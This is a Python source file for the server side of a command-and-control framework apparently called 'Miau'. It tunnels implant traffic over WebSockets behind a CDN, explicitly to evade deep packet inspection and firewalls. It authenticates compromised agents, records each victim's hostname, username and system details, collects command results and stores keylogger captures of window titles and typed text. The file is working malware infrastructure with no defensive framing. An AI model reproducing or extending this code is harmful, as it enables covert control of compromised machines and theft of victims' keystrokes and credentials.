"""DCT - Domain C2 Tunneling over WebSocket.
Masks C2 traffic as ordinary HTTPS/WSS to evade DPI and firewall inspection.

Flow:
  Agent  --WSS-->  CDN/Cloudflare  --WS-->  Miau backend (:8443)
  Agent connects to wss://cdn-domain/dct/{token}
  Backend upgrade -> WebSocket -> pipe to internal C2 listener frame codec.
"""
from __future__ import annotations

import asyncio
import logging
from typing import Optional

from fastapi import WebSocket, WebSocketDisconnect

import codec
import messages_pb2 as pb
from config import Config
from store import Store

log = logging.getLogger("miau.dct")


class DctTunnel:
    """One DCT session bridging a WebSocket to the C2 frame codec."""

    def __init__(self, cfg: Config, store: Store, ws: WebSocket, token_hint: str):
        self.cfg = cfg
        self.store = store
        self.ws = ws
        self.token_hint = token_hint
        self.aes_key: bytes = b""
        self.install_id: str = ""

    async def run(self) -> None:
        try:
            await self.ws.accept()
            log.info("DCT session from %s", self.ws.client)
            await self._pump()
        except WebSocketDisconnect:
            log.debug("DCT client disconnected")
        except Exception:
            log.exception("DCT tunnel crashed")

    async def _pump(self) -> None:
        """Bridge WebSocket <-> C2 frame codec."""
        while True:
            data: bytes = await self.ws.receive_bytes()
            if not data:
                continue

            # Frame format matches codec.py: 4-byte len prefix + AES-GCM blob
            env = self._decode_frame(data)
            if env is None:
                continue

            resp_env = await self._dispatch(env)
            if resp_env:
                await self.ws.send_bytes(self._encode_frame(resp_env))

    def _decode_frame(self, raw: bytes) -> Optional[pb.Envelope]:
        import struct
        if len(raw) < 4:
            return None
        n = struct.unpack(">I", raw[:4])[0]
        body = raw[4:]
        if n != len(body):
            return None
        key = self.aes_key if self.aes_key else self._psk()
        try:
            plain = codec.decrypt_payload(key, body)
            env = pb.Envelope()
            env.ParseFromString(plain)
            return env
        except Exception as exc:
            log.debug("decode failed: %s", exc)
            return None

    def _encode_frame(self, env: pb.Envelope) -> bytes:
        import struct
        raw = env.SerializeToString()
        body = codec.encrypt_payload(self.aes_key or self._psk(), raw)
        return struct.pack(">I", len(body)) + body

    def _psk(self) -> bytes:
        return self.cfg.server.hb_interval.to_bytes(32, "big")

    async def _dispatch(self, env: pb.Envelope) -> Optional[pb.Envelope]:
        """Process C2 envelope, return response envelope."""
        import enums_pb2 as en
        import time

        ptype = env.packet_type
        if ptype == en.PACKET_AUTH:
            return self._on_auth(env)
        elif ptype == en.PACKET_HEARTBEAT:
            self._on_heartbeat(env)
            return None
        elif ptype == en.PACKET_RESPONSE:
            self._on_response(env)
            return None
        elif ptype == en.PACKET_KEYLOG:
            self._on_keylog(env)
            return None
        return None

    def _on_auth(self, env: pb.Envelope) -> pb.Envelope:
        import enums_pb2 as en
        auth = pb.ClientAuth()
        auth.ParseFromString(env.payload)
        rec = self.store.get_token(auth.token)
        if rec is None:
            return pb.Envelope(
                version=1, packet_type=en.PACKET_AUTH_ACK,
                timestamp=int(0),
                payload=pb.AuthAck(accepted=False, reason="bad token").SerializeToString(),
            )
        self.aes_key = bytes(rec["aes_key"])
        self.install_id = auth.install_id
        self.store.upsert_client(
            auth.install_id, token=auth.token,
            hostname=auth.hostname, username=auth.username,
            os=auth.os, arch=auth.arch,
            client_ver=auth.client_ver, state="ONLINE",
        )
        log.info("DCT auth OK: %s (%s)", auth.token, auth.hostname)
        return pb.Envelope(
            version=1, packet_type=en.PACKET_AUTH_ACK,
            timestamp=int(0),
            payload=pb.AuthAck(accepted=True, reason="ok", hb_interval=self.cfg.server.hb_interval).SerializeToString(),
        )

    def _on_heartbeat(self, env: pb.Envelope) -> None:
        import enums_pb2 as en
        if not self.install_id:
            return
        self.store.upsert_client(self.install_id, state="ONLINE", last_seen=int(0))

    def _on_response(self, env: pb.Envelope) -> None:
        resp = pb.Response()
        resp.ParseFromString(env.payload)
        self.store.add_response(
            int(resp.id), str(resp.status), resp.message,
            bytes(resp.data) if resp.data else None, int(resp.final),
        )

    def _on_keylog(self, env: pb.Envelope) -> None:
        kl = pb.KeyLog()
        kl.ParseFromString(env.payload)
        self.store.add_keylog(self.token_hint, kl.window, kl.text, int(kl.ts))
